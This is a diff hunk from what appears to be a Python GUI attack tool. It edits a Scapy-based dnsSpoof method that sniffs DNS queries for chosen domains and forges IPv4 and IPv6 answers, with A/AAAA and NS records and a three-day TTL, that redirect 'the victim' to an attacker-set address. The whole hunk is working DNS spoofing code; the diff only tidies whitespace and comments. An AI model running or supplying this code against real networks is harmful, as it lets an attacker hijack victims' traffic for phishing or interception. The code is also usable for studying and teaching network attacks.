@@ -354,41 +354,23 @@ class dns_window(QMainWindow):
     def dnsSpoof(self,pkt):
 
         for Names in self.hostdict: #For loop to check each name in hostDict
-        
             if (DNS in pkt and Names in pkt[DNS].qd.qname): #Check if qname in packet matches any domain name in the hostDict
                 print(f'packet found {Names}')
                 if IP in pkt:
-                    
                     IPpkt = IP(dst=pkt[IP].src,src=pkt[IP].dst) #Switch source to be destination packet payload is sent back to the victim
-                    
                     UDPpkt = UDP(dport=pkt[UDP].sport,sport=53) #Using UDP port 53 (DNS)
-
                     Anssec = DNSRR(rrname=pkt[DNS].qd.qname,type='A',ttl=259200,rdata=f'{self.ip}') #Set the Answer nd NSsec record rdata to the new IP to redirect the victim
-
                     NSsec = DNSRR(rrname=pkt[DNS].qd.qname, type='NS',ttl=259200,rdata=f'{self.ip}')
-
-                    DNSpkt = DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=1,an=Anssec,ns=NSsec)
-                    #Set qr to 1 to represent a response packet
-
+                    DNSpkt = DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=1,an=Anssec,ns=NSsec)#Set qr to 1 to represent a response packet
                     spoofpkt = IPpkt/UDPpkt/DNSpkt #Store modified variables into spoofpkt
-
                     sendp(spoofpkt,iface=self.interface) #Send spoofed packet to the the victim
-
                 elif IPv6 in pkt:
-                    
                     IPv6pkt = IPv6(dst=pkt[IPv6].src,src=pkt[IPv6].dst) #Switch source to be destination packet payload is sent back to the victim
-                    
                     UDPpkt = UDP(dport=pkt[UDP].sport,sport=53) #Using UDP port 53 (DNS)
-
                     Anssec = DNSRR(rrname=pkt[DNS].qd.qname,type='AAAA',ttl=259200,rdata=f'{self.ipv6}') #Set the Answer nd NSsec record rdata to the new IP to redirect the victim
-
                     NSsec = DNSRR(rrname=pkt[DNS].qd.qname, type='NS',ttl=259200,rdata=f'{self.ipv6}')
-
-                    DNSpkt = DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=1,an=Anssec,ns=NSsec)
-                    #Set qr to 1 to represent a response packet
-
+                    DNSpkt = DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=1,an=Anssec,ns=NSsec)#Set qr to 1 to represent a response packet
                     spoofpkt = IPv6pkt/UDPpkt/DNSpkt #Store modified variables into spoofpkt
-
                     sendp(spoofpkt,iface=self.interface) #Send spoofed packet to the the victim
 
     def set_spoof(self,radio):
